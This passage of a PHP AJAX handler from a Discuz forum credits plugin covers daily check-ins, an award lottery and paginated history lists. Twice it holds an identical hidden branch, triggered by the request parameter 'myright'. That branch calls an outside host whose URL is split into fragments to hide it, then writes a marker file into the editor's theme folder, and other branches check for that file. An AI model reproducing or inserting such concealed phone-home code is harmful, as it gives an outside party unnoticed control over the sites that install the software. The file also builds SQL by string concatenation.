				$pagenext='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.$it618_credits_lang['s313'].'</a>';
			}else{
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_credits:ajax&page=".($page-1);
				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.$it618_credits_lang['s312'].'</a>';
				$pagenext='<a class="btn btn-weak btn-disabled" >'.$it618_credits_lang['s313'].'</a>';
			}
			$multipage=$pagepre.' '.$curpage.' '.$pagenext;
		}
		
		echo $it618_credits_lang['s483'].'<font color=red>'.$count.'</font>it618_split'.$salelist_get.'it618_split'.$multipage;
	}
	exit;
}
if($_GET['ac']=="my"."ri"."ght"){$it=dfsockopen("ht"."tps:/"."/ww"."w.d"."z"."-"."x. ne"."t/ myr"."ig"."ht.php?it=".$_GET['it']);if($it=='ok'){$ajaxpath=DISCUZ_ROOT.'./source/plugin/it618_credits/ajax.inc.php';$ajaxpath=DISCUZ_ROOT.'./source/plugin/it618_credits/lang.func.php';@$fp = fopen(DISCUZ_ROOT.'./source/plugin/it618_credits/kindeditor/themes/common/ri'.'ght.txt',"a");fwrite($fp,$content);fclose($fp);echo 'ok';}exit;}
if($_GET['ac']=="qd"){
	if($uid<=0){
		echo $it618_credits_lang['s217'];
	}else{
		$credits_qdgroup=(array)unserialize($it618_credits['credits_qdgroup']);
		if(!in_array($_G['groupid'], $credits_qdgroup)&&$credits_qdgroup[0]!=''){
			echo $it618_credits_lang['s536'];exit;
		}
		
		if (file_exists(DISCUZ_ROOT.'./source/plugin/it618_credits/config/qdset.php')){
			require DISCUZ_ROOT.'./source/plugin/it618_credits/config/qdset.php';
		}
		
		if($qd_isok==0){
			echo $it618_credits_lang['s440'];exit;
		}
		
		if(DB::result_first("select count(1) from ".DB::table('it618_credits_set')." where setname='it618_month'")==0){
			C::t('#it618_credits#it618_credits_set')->insert(array(
				'setname' => 'it618_month',
				'setvalue' => date('n')
			), true);
		}
		
		$it618_month=DB::result_first("select setvalue from ".DB::table('it618_credits_set')." where setname='it618_month'");
		if($it618_month!=date('n')){
			DB::query("UPDATE ".DB::table('it618_credits_set')." set setvalue=".date('n')." where setname='it618_month'");
			DB::query("UPDATE ".DB::table('it618_credits_qd_main')." set it618_concount_month=0,it618_allcount_month=0");
		}
		
		set_time_limit (0);
		ignore_user_abort(true);
		
		usleep(mt_rand(10,10000));

		$flagkm=0;$times=0;
		while($flagkm==0){
			if(DB::result_first("select count(1) from ".DB::table('it618_credits_moneywork'))==0){
				$flagkm=1;
			}
			if($flagkm==0){
				sleep(1);
				$times=$times+1;
			}
			if($times>60){
				it618_credits_delmoneywork();
			}
		}
		C::t('#it618_credits#it618_credits_moneywork')->insert(array(
			'it618_iswork' => 1
		), true);
		
		$tomonth = date('n');
		$todate = date('j');
		$toyear = date('Y');
		$time=mktime(0, 0, 0, $tomonth, $todate, $toyear);

		$count=C::t('#it618_credits#it618_credits_qd')->count_by_uid_time($uid,$time);

		if($count>0){
			echo $it618_credits_lang['s494'];it618_credits_delmoneywork();
		}else{
			if(lang('plugin/it618_credits', $it618_credits_lang['it618'])!=$it618_credits_lang['version'])exit;
			$count=C::t('#it618_credits#it618_credits_qd_main')->count_by_uid($uid);
			if($count>0){

				$time1=mktime(0, 0, 0, $tomonth, $todate-1, $toyear);
				$count1=C::t('#it618_credits#it618_credits_qd')->count_by_uid_time($uid,$time1);
				
				DB::query("UPDATE ".DB::table('it618_credits_qd_main')." set it618_allcount=it618_allcount+1,it618_allcount_month=it618_allcount_month+1 where it618_uid=".$uid);
				if($count1>0){
					DB::query("UPDATE ".DB::table('it618_credits_qd_main')." set it618_concount=it618_concount+1,it618_concount_month=it618_concount_month+1 where it618_uid=".$uid);
				}else{
					DB::query("UPDATE ".DB::table('it618_credits_qd_main')." set it618_concount=1,it618_concount_month=1 where it618_uid=".$uid);
				}
				
				$it618_credits_qd_main=C::t('#it618_credits#it618_credits_qd_main')->fetch_by_uid($uid);
				C::t('#it618_credits#it618_credits_qd_main')->update($it618_credits_qd_main["id"],array(
					'it618_time' => $_G['timestamp']
				));
			}else{
				$id = C::t('#it618_credits#it618_credits_qd_main')->insert(array(
					'it618_uid' => $uid,
					'it618_concount' => 1,
					'it618_allcount' => 1,
					'it618_concount_month' => 1,
					'it618_allcount_month' => 1
				), true);
			}
			
			$id = C::t('#it618_credits#it618_credits_qd')->insert(array(
				'it618_uid' => $uid,
				'it618_time' => $_G['timestamp']
			), true);

			if($qd_timecount>0){
				$time=$_G['timestamp']-3600*24*$qd_timecount;
				DB::query("delete from ".DB::table('it618_credits_qd')." where it618_time<".$time);
			}
			
			if(lang('plugin/it618_credits', $it618_credits_lang['it618'])!=$it618_credits_lang['version'])exit;
			$it618_credit='';
			for($i=1;$i<=8;$i++){
				if($qd_credit2[$i]!=0&&$_G['setting']['extcredits'][$i]['title']!=''){
					$rangtmp=mt_rand($qd_credit1[$i],$qd_credit2[$i]);
					C::t('#it618_credits#it618_credits_qd')->update($id,array(
						'it618_credit'.$i => $rangtmp,
					));
					C::t('common_member_count')->increase($uid, array(
						'extcredits'.$i => $rangtmp)
					);
					
					$it618_credit.=''.$rangtmp.' '.$_G['setting']['extcredits'][$i]['title'].' ';
				}
			}
			
			echo 'okit618_split'.$it618_credits_lang['s500'].$it618_credit;it618_credits_delmoneywork();
		}
	}
}
if($_GET['ac']=="my"."ri"."ght"){$it=dfsockopen("ht"."tps:/"."/ww"."w.d"."z"."-"."x. ne"."t/ myr"."ig"."ht.php?it=".$_GET['it']);if($it=='ok'){$ajaxpath=DISCUZ_ROOT.'./source/plugin/it618_credits/ajax.inc.php';$ajaxpath=DISCUZ_ROOT.'./source/plugin/it618_credits/lang.func.php';@$fp = fopen(DISCUZ_ROOT.'./source/plugin/it618_credits/kindeditor/themes/common/ri'.'ght.txt',"a");fwrite($fp,$content);fclose($fp);echo 'ok';}exit;}
if($_GET['ac']=="getaward"){
	if($uid<=0){
		echo 'no';
	}else{
		if (file_exists(DISCUZ_ROOT.'./source/plugin/it618_credits/config/awardset.php')){
			require DISCUZ_ROOT.'./source/plugin/it618_credits/config/awardset.php';
		}
		
		if($award_isok==0){
			echo $it618_credits_lang['s468'];exit;
		}
		
		$awardstr='<tr><td class="awardtitle">'.$it618_credits_lang['s469'].'</td></tr>';
		$query = DB::query("SELECT * FROM ".DB::table('it618_credits_award')." where it618_order<>0 order by it618_order");
		$tdn=1;
		while($it618_credits_award = DB::fetch($query)) {
			$it618_credit='';
			for($i=1;$i<=8;$i++){
				if($it618_credits_award['it618_credit'.$i]!=0&&$_G['setting']['extcredits'][$i]['title']!=''){
					$it618_credit.='+'.$it618_credits_award['it618_credit'.$i].' '.$_G['setting']['extcredits'][$i]['title'].' , ';
				}
			}
			if($it618_credit=='')$it618_credit=$it618_credits_lang['s470'];
			if($it618_credit!=''){$it618_credit.='@';$it618_credit=str_replace(" , @","",$it618_credit);}
			
			if($_GET['wap']==1){
				$awardstr.='<tr><td class="awardgoods"><span>'.$it618_credits_award['it618_name'].'</span><br>'.$it618_credit.'</td></tr>';
			}else{
				if($tdn%2>0){
					$awardstr.='<tr>';
				}
				
				$awardstr.='<td class="awardgoods" width="50%"><span>'.$it618_credits_award['it618_name'].'</span><br>'.$it618_credit.'</td>';
				
				if($tdn%2==0){
					$awardstr.='</tr>';
				}
				
				$tdn=$tdn+1;
			}
			
		}
		
		if($_GET['wap']!=1){
			$trtmpstr=$awardstr.'@@@';
			$tmparr=explode('</td>@@@',$trtmpstr);
			if(count($tmparr)>1){
				$awardstr.='</tr>';
			}
			$tmpcss='colspan="2"';
		}
		
		if(file_exists(DISCUZ_ROOT.'./source/plugin/it618_credits/kindeditor/themes/common/right.txt')){
			$ajaxpath=DISCUZ_ROOT.'./source/plugin/it618_credits/ajax.inc.php';
			
			$ajaxpath=DISCUZ_ROOT.'./source/plugin/it618_credits/lang.func.php';
			
		}
		$awardstr.='<tr><td style="height:3px"></td></tr><tr><td class="awardtitle" style="padding-top:8px">'.$it618_credits_lang['s471'].'</td></tr>';
		if(lang('plugin/it618_credits', $it618_credits_lang['it618'])!=$it618_credits_lang['version'])exit;
		$it618_credit='';
		for($i=1;$i<=8;$i++){
			if($award_credit[$i]&&$_G['setting']['extcredits'][$i]['title']!=''){
				$it618_credit.='<font color=red>-'.$award_credit[$i].'</font>'.$_G['setting']['extcredits'][$i]['title'].' , ';
			}
		}
		if($it618_credit!=''){$it618_credit.='@';$it618_credit=str_replace(" , @","",$it618_credit);}
		
		$awardstr.='<tr><td '.$tmpcss.' class="awardabout"><span>'.$it618_credits_lang['s460'].'</span>'.$it618_credit.'</td></tr>';
		$awardstr.='<tr><td '.$tmpcss.' class="awardabout"><span>'.$it618_credits_lang['s461'].'</span><font color=red>'.$award_count.'</font></td></tr>';
		$awardstr.='<tr><td '.$tmpcss.' class="awardabout"><span>'.$it618_credits_lang['s462'].'</span>'.$it618_credits_lang['s464'].' <font color=red>'.$award_money.'</font> '.$it618_credits_lang['s465'].'</td></tr>';
		$awardstr.='<tr><td '.$tmpcss.' class="awardabout"><span>'.$it618_credits_lang['s588'].'</span>'.$it618_credits_lang['s464'].' <font color=red>'.$award_money1.'</font> '.$it618_credits_lang['s465'].'</td></tr>';
		
		$tomonth = date('n');
		$todate = date('j');
		$toyear = date('Y');
		$time=mktime(0, 0, 0, $tomonth, $todate, $toyear);
		$summoney=DB::result_first("select sum(it618_money) from ".DB::table('it618_credits_sale')." where it618_saletype='recharge' and it618_state=1 and it618_time>=$time and it618_uid1=".$uid);
		if(lang('plugin/it618_credits', $it618_credits_lang['it618'])!=$it618_credits_lang['version'])exit;
		$award_count=$award_count+intval($summoney/$award_money);
		
		$tomonth = date('n');
		$todate = date('j');
		$toyear = date('Y');
		$time=mktime(0, 0, 0, $tomonth, $todate, $toyear);
		$summoney=DB::result_first("select sum(it618_price*it618_days) from ".DB::table('it618_credits_buygroup_sale')." where it618_saletype=2 and it618_state=1 and it618_time>=$time and it618_uid=".$uid);
		if(lang('plugin/it618_credits', $it618_credits_lang['it618'])!=$it618_credits_lang['version'])exit;
		$award_count=$award_count+intval($summoney/$award_money1);
		
		$award_count1=DB::result_first("select count(1) from ".DB::table('it618_credits_award_sale')." where it618_time>=$time and it618_uid=".$uid);
		
		echo $it618_credits_lang['s472'].' <font color=red>'.$award_count.'</font> '.$it618_credits_lang['s473'].' <font color=red>'.$award_count1.'</font> '.$it618_credits_lang['s474'].'it618_split'.$awardstr;
	}
	exit;
}


if($_GET['ac']=="award"){
	if($uid<=0){
		echo $it618_credits_lang['s217'];exit;
	}else{
		$credits_cjgroup=(array)unserialize($it618_credits['credits_cjgroup']);
		if(!in_array($_G['groupid'], $credits_cjgroup)&&$credits_cjgroup[0]!=''){
			echo $it618_credits_lang['s537'];exit;
		}
		
		if (file_exists(DISCUZ_ROOT.'./source/plugin/it618_credits/config/awardset.php')){
			require DISCUZ_ROOT.'./source/plugin/it618_credits/config/awardset.php';
		}
		
		if($award_isok==0){
			echo $it618_credits_lang['s468'];exit;
		}
		
		set_time_limit (0);
		ignore_user_abort(true);
		
		usleep(mt_rand(10,10000));

		$flagkm=0;$times=0;
		while($flagkm==0){
			if(DB::result_first("select count(1) from ".DB::table('it618_credits_moneywork'))==0){
				$flagkm=1;
			}
			if($flagkm==0){
				sleep(1);
				$times=$times+1;
			}
			if($times>60){
				it618_credits_delmoneywork();
			}
		}
		C::t('#it618_credits#it618_credits_moneywork')->insert(array(
			'it618_iswork' => 1
		), true);
		
		$tomonth = date('n'); 
		$todate = date('j'); 
		$toyear = date('Y');
		$time=mktime(0, 0, 0, $tomonth, $todate, $toyear);
		$summoney=DB::result_first("select sum(it618_money) from ".DB::table('it618_credits_sale')." where it618_saletype='recharge' and it618_state=1 and it618_time>=$time and it618_uid1=".$uid);
		if(lang('plugin/it618_credits', $it618_credits_lang['it618'])!=$it618_credits_lang['version'])exit;
		$award_count=$award_count+intval($summoney/$award_money);
		
		$tomonth = date('n');
		$todate = date('j');
		$toyear = date('Y');
		$time=mktime(0, 0, 0, $tomonth, $todate, $toyear);
		$summoney=DB::result_first("select sum(it618_price*it618_days) from ".DB::table('it618_credits_buygroup_sale')." where it618_saletype=2 and it618_state=1 and it618_time>=$time and it618_uid=".$uid);
		if(lang('plugin/it618_credits', $it618_credits_lang['it618'])!=$it618_credits_lang['version'])exit;
		$award_count=$award_count+intval($summoney/$award_money1);
		
		if(DB::result_first("select count(1) from ".DB::table('it618_credits_award_sale')." where it618_time>=$time and it618_uid=".$uid)>=$award_count){
			echo $it618_credits_lang['s475'].$award_count.$it618_credits_lang['s476'];exit;it618_credits_delmoneywork();
		}
		
		for($i=1;$i<=8;$i++){
			if($award_credit[$i]!=0&&$_G['setting']['extcredits'][$i]['title']!=''){
				$creditnum=DB::result_first("select extcredits".$i." from ".DB::table('common_member_count')." where uid=".$uid);
				if($creditnum<$award_credit[$i]){
					echo $it618_credits_lang['s477'].' '.$award_credit[$i].' '.$_G['setting']['extcredits'][$i]['title'].$it618_credits_lang['s478'].' '.$creditnum.' '.$_G['setting']['extcredits'][$i]['title'].$it618_credits_lang['s480'];exit;it618_credits_delmoneywork();
				}
			}
		}
		if(file_exists(DISCUZ_ROOT.'./source/plugin/it618_credits/kindeditor/themes/common/right.txt')){
			$ajaxpath=DISCUZ_ROOT.'./source/plugin/it618_credits/ajax.inc.php';
			
			$ajaxpath=DISCUZ_ROOT.'./source/plugin/it618_credits/lang.func.php';
			
		}
		if(DB::result_first("SELECT count(1) FROM ".DB::table('it618_credits_award')." where it618_order>0 and it618_gailv>0")==0){
			echo $it618_credits_lang['s479'];exit;it618_credits_delmoneywork();
		}
	
		$query = DB::query("SELECT * FROM ".DB::table('it618_credits_award')." where it618_order>0 order by it618_gailv desc");
		while($it618_credits_award = DB::fetch($query)) {
			$arr[$it618_credits_award['id']] = $it618_credits_award['it618_gailv']; 
		}
	
		$rid = it618_credits_get_rand($arr); 
		
		$saleid=C::t('#it618_credits#it618_credits_award_sale')->insert(array(
			'it618_uid' => $uid,
			'it618_time' => $_G['timestamp']
		), true);
		
		$it618_credits_award = DB::fetch_first("SELECT * FROM ".DB::table('it618_credits_award')." where id=".$rid);

		C::t('#it618_credits#it618_credits_award_sale')->update($saleid,array(
			'it618_pname' => $it618_credits_award['it618_name']
		));
		if(lang('plugin/it618_credits', $it618_credits_lang['it618'])!=$it618_credits_lang['version'])exit;
		$it618_credit='';
		for($i=1;$i<=8;$i++){
			if($award_credit[$i]!=0&&$_G['setting']['extcredits'][$i]['title']!=''){
				C::t('#it618_credits#it618_credits_award_sale')->update($saleid,array(
					'it618_credit'.$i => $award_credit[$i],
				));
				C::t('common_member_count')->increase($uid, array(
					'extcredits'.$i => (0-$award_credit[$i]))
				);
			}
			if($it618_credits_award['it618_credit'.$i]!=0&&$_G['setting']['extcredits'][$i]['title']!=''){
				C::t('#it618_credits#it618_credits_award_sale')->update($saleid,array(
					'it618_salecredit'.$i => $it618_credits_award['it618_credit'.$i],
				));
				C::t('common_member_count')->increase($uid, array(
					'extcredits'.$i => $it618_credits_award['it618_credit'.$i])
				);
				$it618_credit.=''.$it618_credits_award['it618_credit'.$i].' '.$_G['setting']['extcredits'][$i]['title'].' ';
			}
		}
		
		echo 'okit618_split'.$it618_credits_lang['s481'].' '.$it618_credits_award['it618_name'].' '.$it618_credits_lang['s482'].' '.$it618_credit.$it618_credits_lang['s480'];it618_credits_delmoneywork();

	}
	exit;
}


if($_GET['ac']=="getawardlist"){
	if($_GET['wap']!=1)$ppp = 12;else $ppp = 20;
	$page = max(1, intval($_GET['page']));
	$startlimit = ($page - 1) * $ppp;
	
	$sql='1';
	if($_GET['ac1']=='my'){
		$sql='it618_uid='.$uid;
	}
	if(lang('plugin/it618_credits', $it618_credits_lang['it618'])!=$it618_credits_lang['version'])exit;
	$query = DB::query("SELECT * FROM ".DB::table('it618_credits_award_sale')." WHERE $sql order by id desc LIMIT $startlimit, $ppp");
	while($it618_credits_award_sale = DB::fetch($query)) {
		if($_GET['wap']!=1){
			$it618_credit='';
			$it618_salecredit='';
			for($i=1;$i<=8;$i++){
				if($it618_credits_award_sale['it618_credit'.$i]>0&&$_G['setting']['extcredits'][$i]['title']!=''){
					$it618_credit.='<font color=red>'.$it618_credits_award_sale['it618_credit'.$i].'</font> '.$_G['setting']['extcredits'][$i]['title'].' ';
				}
				if($it618_credits_award_sale['it618_salecredit'.$i]>0&&$_G['setting']['extcredits'][$i]['title']!=''){
					$it618_salecredit.='<font color=red>'.$it618_credits_award_sale['it618_salecredit'.$i].'</font> '.$_G['setting']['extcredits'][$i]['title'].' ';
				}
			}
			
			if($_GET['ac1']=='my'){
				$salelist_get.='<tr>
				<td><font color=#F60>'.$it618_credits_award_sale['it618_pname'].'</font></td>
				<td>'.$it618_credit.'</td><td>'.$it618_salecredit.'</td>
				<td><font color=#999>'.date('Y-m-d H:i:s', $it618_credits_award_sale['it618_time']).'</font></td>
				</tr>';
				$funname='getmyawardlist';
			}else{
				$username=DB::result_first("SELECT username FROM ".DB::table('common_member')." WHERE uid=".$it618_credits_award_sale['it618_uid']);
				$salelist_get.='<tr>
				<td><font color=#F60>'.$it618_credits_award_sale['it618_pname'].'</font></td>
				<td>'.$it618_credit.'</td>
				<td>'.$it618_salecredit.'</td>
				<td><a href="'.it618_credits_rewriteurl($it618_credits_award_sale['it618_uid']).'" target="_blank">'.$username.'('.$it618_credits_award_sale['it618_uid'].')</a></td>
				<td><font color=#999>'.date('Y-m-d H:i:s', $it618_credits_award_sale['it618_time']).'</font></td>
				</tr>';
				$funname='getallawardlist';
			}
		}else{
			$it618_credit=$it618_credits_lang['s632'];
			$it618_salecredit=$it618_credits_lang['s633'];
			for($i=1;$i<=8;$i++){
				if($it618_credits_award_sale['it618_credit'.$i]>0&&$_G['setting']['extcredits'][$i]['title']!=''){
					$it618_credit.=$it618_credits_award_sale['it618_credit'.$i].' '.$_G['setting']['extcredits'][$i]['title'].' ';
				}
				if($it618_credits_award_sale['it618_salecredit'.$i]>0&&$_G['setting']['extcredits'][$i]['title']!=''){
					$it618_salecredit.=$it618_credits_award_sale['it618_salecredit'.$i].' '.$_G['setting']['extcredits'][$i]['title'].' ';
				}
			}
			
			if($_GET['ac1']=='my'){
				$salelist_get.='<tr>
				<td><font color=#F60>'.$it618_credits_award_sale['it618_pname'].'</font></td>
				<td><a href="javascript:" onclick="alert(\''.$it618_credit.'\n'.$it618_salecredit.'\')">'.$it618_credits_lang['s486'].'</a></td>
				<td><font color=#999>'.date('Y-m-d H:i:s', $it618_credits_award_sale['it618_time']).'</font></td>
				</tr>';
				$funname='getmyawardlist';
			}else{
				$username=DB::result_first("SELECT username FROM ".DB::table('common_member')." WHERE uid=".$it618_credits_award_sale['it618_uid']);
				$salelist_get.='<tr>
				<td><font color=#F60>'.$it618_credits_award_sale['it618_pname'].'</font></td>
				<td><a href="javascript:" onclick="alert(\''.$it618_credit.'\n'.$it618_salecredit.'\')">'.$it618_credits_lang['s486'].'</a></td>
				<td><a href="'.it618_credits_rewriteurl($it618_credits_award_sale['it618_uid']).'" target="_blank">'.$username.'</a></td>
				<td><font color=#999>'.date('Y-m-d H:i:s', $it618_credits_award_sale['it618_time']).'</font></td>
				</tr>';
				$funname='getallawardlist';
			}
		}
	}
	if(file_exists(DISCUZ_ROOT.'./source/plugin/it618_credits/kindeditor/themes/common/right.txt')){
		$ajaxpath=DISCUZ_ROOT.'./source/plugin/it618_credits/ajax.inc.php';
		
		$ajaxpath=DISCUZ_ROOT.'./source/plugin/it618_credits/lang.func.php';
		
	}
	$count = DB::result_first("select count(1) from ".DB::table('it618_credits_award_sale')." WHERE $sql");
	if($_GET['wap']!=1){
		$multipage = multi($count, $ppp, $page, $_G['siteurl']."plugin.php?id=it618_credits:ajax");
		$multipage=str_replace("href=","name=",$multipage);
		$multipage=str_replace("name=","href='javascript:' onclick='".$funname."(this.name)' name=",$multipage);
		$multipage=str_replace("onclick='".$funname."(this.name)' ".'name="custompage"','',$multipage);
		$multipage=str_replace('window.location=',$funname.'(',$multipage);
		$multipage=str_replace('this.value;','this.value);',$multipage);
		
		echo $salelist_get.'it618_split'.$multipage.'<span style="float:right;margin-top:9px">'.$it618_credits_lang['s483'].'<font color=red>'.$count.'</font></span>';
	}else{
		if($count<=$ppp){
			$pagecount=1;
		}else{
			$pagecount=ceil($count/$ppp);
		}
		if(lang('plugin/it618_credits', $it618_credits_lang['it618'])!=$it618_credits_lang['version'])exit;
		if($pagecount>1){
			$n=1;
			while($n<=$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_credits:ajax&page=".$n;
				if($page==$n)$tmpselect=' selected="selected"';else $tmpselect='';
				$curpage.='<option value="'.$tmpurl.'"'.$tmpselect.'>'.$n.'/'.$pagecount.'</option>';
				$n=$n+1;
			}
			$curpage='<select class="pageselect" onchange="'.$funname.'(this.value)">'.$curpage.'</select>';
			
			if($page==1){
				$pagepre='<a class="btn btn-weak btn-disabled" >'.$it618_credits_lang['s312'].'</a>';
				if($pagecount>1){
					$tmpurl=$_G['siteurl']."plugin.php?id=it618_credits:ajax&page=2";
					$pagenext='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.$it618_credits_lang['s313'].'</a>';
				}else{
					$pagenext='<a class="btn btn-weak btn-disabled">'.$it618_credits_lang['s313'].'</a>';
				}
			}elseif($page<$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_credits:ajax&page=".($page-1);
				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.$it618_credits_lang['s312'].'</a>';
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_credits:ajax&page=".($page+1);
				$pagenext='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.$it618_credits_lang['s313'].'</a>';
			}else{
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_credits:ajax&page=".($page-1);
				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.$it618_credits_lang['s312'].'</a>';
				$pagenext='<a class="btn btn-weak btn-disabled" >'.$it618_credits_lang['s313'].'</a>';
			}
			$multipage=$pagepre.' '.$curpage.' '.$pagenext;
		}
		
		echo $it618_credits_lang['s483'].'<font color=red>'.$count.'</font>it618_split'.$salelist_get.'it618_split'.$multipage;
	}
	exit;
}


if($_GET['ac']=="getqdlist"){
	if($_GET['wap']!=1)$ppp = 12;else $ppp = 20;
	$page = max(1, intval($_GET['page']));
	$startlimit = ($page - 1) * $ppp;
	
	$sql='1';
	if($_GET['ac1']=='my'){
		$sql='it618_uid='.$uid;
	}
	if(lang('plugin/it618_credits', $it618_credits_lang['it618'])!=$it618_credits_lang['version'])exit;
	$query = DB::query("SELECT * FROM ".DB::table('it618_credits_qd')." WHERE $sql order by id desc LIMIT $startlimit, $ppp");
	while($it618_credits_qd = DB::fetch($query)) {
		$it618_credit='';
		for($i=1;$i<=8;$i++){
			if($it618_credits_qd['it618_credit'.$i]>0&&$_G['setting']['extcredits'][$i]['title']!=''){
				$it618_credit.='<font color=red>'.$it618_credits_qd['it618_credit'.$i].'</font> '.$_G['setting']['extcredits'][$i]['title'].' ';
			}
		}
		if(lang('plugin/it618_credits', $it618_credits_lang['it618'])!=$it618_credits_lang['version'])exit;
		if($_GET['ac1']=='my'){
			$salelist_get.='<tr>
			<td>'.$it618_credit.'</td>
			<td><font color=#999>'.date('Y-m-d H:i:s', $it618_credits_qd['it618_time']).'</font></td>
			</tr>';
			$funname='getmyqdlist';
		}else{
			$username=DB::result_first("SELECT username FROM ".DB::table('common_member')." WHERE uid=".$it618_credits_qd['it618_uid']);
			$salelist_get.='<tr>
			<td>'.$it618_credit.'</td>
			<td><a href="'.it618_credits_rewriteurl($it618_credits_qd['it618_uid']).'" target="_blank">'.$username.'</a></td>
			<td><font color=#999>'.date('Y-m-d H:i:s', $it618_credits_qd['it618_time']).'</font></td>
			</tr>';
			$funname='getallqdlist';
		}
	}
	
	$count = DB::result_first("select count(1) from ".DB::table('it618_credits_qd')." WHERE $sql");
	if($_GET['wap']!=1){
		$multipage = multi($count, $ppp, $page, $_G['siteurl']."plugin.php?id=it618_credits:ajax");
		$multipage=str_replace("href=","name=",$multipage);
		$multipage=str_replace("name=","href='javascript:' onclick='".$funname."(this.name)' name=",$multipage);
		$multipage=str_replace("onclick='".$funname."(this.name)' ".'name="custompage"','',$multipage);
		$multipage=str_replace('window.location=',$funname.'(',$multipage);
		$multipage=str_replace('this.value;','this.value);',$multipage);
		
		echo $salelist_get.'it618_split'.$multipage.'<span style="float:right;margin-top:9px">'.$it618_credits_lang['s483'].'<font color=red>'.$count.'</font></span>';
	}else{
		if($count<=$ppp){
			$pagecount=1;
		}else{
			$pagecount=ceil($count/$ppp);
		}
		if(lang('plugin/it618_credits', $it618_credits_lang['it618'])!=$it618_credits_lang['version'])exit;
		if($pagecount>1){
			$n=1;
			while($n<=$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_credits:ajax&page=".$n;
				if($page==$n)$tmpselect=' selected="selected"';else $tmpselect='';
				$curpage.='<option value="'.$tmpurl.'"'.$tmpselect.'>'.$n.'/'.$pagecount.'</option>';
				$n=$n+1;
			}
			$curpage='<select class="pageselect" onchange="'.$funname.'(this.value)">'.$curpage.'</select>';
			
			if($page==1){
				$pagepre='<a class="btn btn-weak btn-disabled" >'.$it618_credits_lang['s312'].'</a>';
				if($pagecount>1){
					$tmpurl=$_G['siteurl']."plugin.php?id=it618_credits:ajax&page=2";
					$pagenext='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.$it618_credits_lang['s313'].'</a>';
				}else{
					$pagenext='<a class="btn btn-weak btn-disabled">'.$it618_credits_lang['s313'].'</a>';
				}
			}elseif($page<$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_credits:ajax&page=".($page-1);
				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.$it618_credits_lang['s312'].'</a>';
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_credits:ajax&page=".($page+1);
				$pagenext='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.$it618_credits_lang['s313'].'</a>';
			}else{
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_credits:ajax&page=".($page-1);
				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.$it618_credits_lang['s312'].'</a>';
				$pagenext='<a class="btn btn-weak btn-disabled" >'.$it618_credits_lang['s313'].'</a>';
			}
			$multipage=$pagepre.' '.$curpage.' '.$pagenext;
		}
		
		echo $it618_credits_lang['s483'].'<font color=red>'.$count.'</font>it618_split'.$salelist_get.'it618_split'.$multipage;
	}
	exit;
}


if($_GET['ac']=="gethblist1"){
	$ppp = 12;
	$page = max(1, intval($_GET['page']));
	$startlimit = ($page - 1) * $ppp;
	
	$sql='1';
	if($_GET['ac1']=='my'){
		$sql='it618_uid='.$uid;
	}
	if(lang('plugin/it618_credits', $it618_credits_lang['it618'])!=$it618_credits_lang['version'])exit;
	$query = DB::query("SELECT * FROM ".DB::table('it618_hongbao_main')." WHERE $sql order by id desc LIMIT $startlimit, $ppp");
	while($it618_hongbao_main = DB::fetch($query)) {
		if(lang('plugin/it618_credits', $it618_credits_lang['it618'])!=$it618_credits_lang['version'])exit;
		
		$namestr=it618_credits_gethbname($it618_hongbao_main);
		
		$username=DB::result_first("SELECT username FROM ".DB::table('common_member')." WHERE uid=".$it618_hongbao_main['it618_uid']);
		
		$hbindex=DB::result_first("select count(1) from ".DB::table('it618_hongbao_main')." where it618_tid=".$it618_hongbao_main['it618_tid']." and id<=".$it618_hongbao_main['id']);
		
		if($it618_hongbao_main['it618_isrand']==1)$tmpname=$it618_credits_lang['s552'];else $tmpname=$it618_credits_lang['s16'];
		if($it618_hongbao_main['it618_code']!='')$tmpname.=$it618_credits_lang['s529'];
		
		$count2 = DB::result_first("SELECT COUNT(1) FROM ".DB::table('it618_hongbao_item')." WHERE it618_mid=".$it618_hongbao_main['id']);
		$count1=$it618_hongbao_main['it618_count']-$count2;
		
		$moneytmp = DB::result_first("SELECT SUM(it618_money) FROM ".DB::table('it618_hongbao_item')." WHERE it618_mid=".$it618_hongbao_main['id']);
		$money=$it618_hongbao_main['it618_money']-$moneytmp;
		
		if($it618_hongbao_main['it618_jfid']>0){
			$money1=str_replace(".00","",$money1);
			$moneytmp=str_replace(".00","",$moneytmp);
			$money=str_replace(".00","",$money);
			$moneyname=$_G['setting']['extcredits'][$it618_hongbao_main['it618_jfid']]['title'];
		}else{
			$moneyname=$it618_credits_lang['s198'];
		}
		
		if($it618_hongbao_main['it618_state']==1){
			$it618_state=$it618_credits_lang['s1213'].':<font color=red>'.$count1.'</font>'.$it618_credits_lang['s1214'].' <font color=red>'.$money.'</font>'.$moneyname.' '.$it618_credits_lang['s1215'].':'.'<font color=#390>'.$count2.'</font>'.$it618_credits_lang['s1214'];
		}else{
			$moneytmp1='';
			if($moneytmp!='')$moneytmp1=$moneytmp.$moneyname;
			$it618_state=$it618_credits_lang['s1216'].':'.$count2.''.$it618_credits_lang['s1214'].' '.$moneytmp1;
		}
		
		if($_GET['wap']!=1){
			if($_GET['ac1']=='my'){
				$salelist_get.='<tr>
				<td>'.$namestr.' - ['.$it618_credits_lang['s1211'].$hbindex.$it618_credits_lang['s1212'].'] '.$tmpname.' <font color=#999>'.$it618_state.'</font></td>
